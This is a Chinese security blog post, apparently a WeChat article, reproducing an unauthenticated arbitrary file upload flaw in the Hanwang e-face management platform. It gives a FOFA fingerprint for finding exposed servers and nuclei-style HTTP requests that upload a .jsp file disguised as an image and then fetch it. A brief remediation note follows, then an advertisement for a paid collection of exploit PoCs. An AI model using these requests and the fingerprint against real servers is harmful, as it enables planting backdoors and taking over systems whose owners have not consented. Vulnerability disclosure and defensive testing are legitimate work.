#  汉王e脸通综合管理平台 uploadMeetingFile.do 任意文件上传漏洞  
 北雪网络安全   2026-09-02 01:36  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
01  
  
更多内容  
  
#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296  
  
  
02  
  
搜索引擎  
  
  
fofa  
：  
icon_hash="1380907357"  
  
  
  
03  
  
漏洞复现  
  
汉王  
e  
脸通综合管理平台  
 uploadMeetingFile.do   
任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞写入后门，获取服务器权限，进而控制整个  
 web   
服务器。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhe5XgbNs1yP7epiaqyQfQKt2AmdmxtUrYdLy0pA05OiaYV3GANfPUkLvJd9RKibziaQQJ2srrAiav5O4nUtK18Tn0ia2gN6iccNibs9ps/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzheehHLzlD9L4TS5nUHGQbhqW5WBkTHoUTkyq1GOCfA8w96rwNBVR4wcbia5mTVK0Ff5VjrCq431MJnXVVGCNrmmabtkbpZxpXA/640?wx_fmt=png&from=appmsg "")  
  
  
```
POST /manage/meetingPersonal/uploadMeetingFile.do?recoToken=67mds2pxXQb&type= HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzhHyDHMREP1pmFTCZ6RviajX2ojYpThQX9xW69mwYptopcWWDtQdxu9hbibItUO6nkRFIlHHNibSEQTMWGxu68bEh88HFglicSK28M/640?wx_fmt=png&from=appmsg "")  
```
POST /manage/meetingPersonal/uploadMeetingFile.do?recoToken=67mds2pxXQb&type= HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
Content-Type: image/jpeg

{{randstr_1}}
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziaaxrc3WOeNFUapBwoOzSBU6RpF0lyL2P4H6UredZviaDkZpGSYm3Vc4xXIsBHM3s4CEyNEz2L44MvOj0Ze0wLEatibdSdB13Al8/640?wx_fmt=png&from=appmsg "")  
```
GET /manage/resource/{{path}} HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhaetxAuLD0LLFmje0zeiceL5H8XRYibxgtoicUbcHEqdpGszOhmuJVIPMaibZtibQsaqgLtvwvN4qg8PDcZd50cx2AIyUZuDICNhEs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjAiaT0C50KRkbO5UXNxG2tRe8HfNlCsdkXLNS44sjsNMpwOjnA8pFWI9kZNe3sz5oWhkWXF58pRargvVG8ZOT50xjHsIfNicJwU/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
修复建议  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
05  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
目前已更新poc数量2500+  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzju7bG3Xll9DMYf4lW9bUYsLuAwibHejic4HC99POYGetnbtShwHpAv9B64oq3ParsHt8aqeutajBkS7y8ia6Turo5oZT4GOFHnZI/640?wx_fmt=png&from=appmsg "")  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营**  
  
****  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/d7u6ib4OKSzg2jWgOzXeqKFWiaudg2V66H2BW1Z5p89I9dCXU8I2Faw9f54gXTNSlA3R9hROO4FrDtFf8pnAicWKqNCgGkeXO2Ycf8iagpbZf34/640?wx_fmt=jpeg&from=appmsg "")  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
****  
  
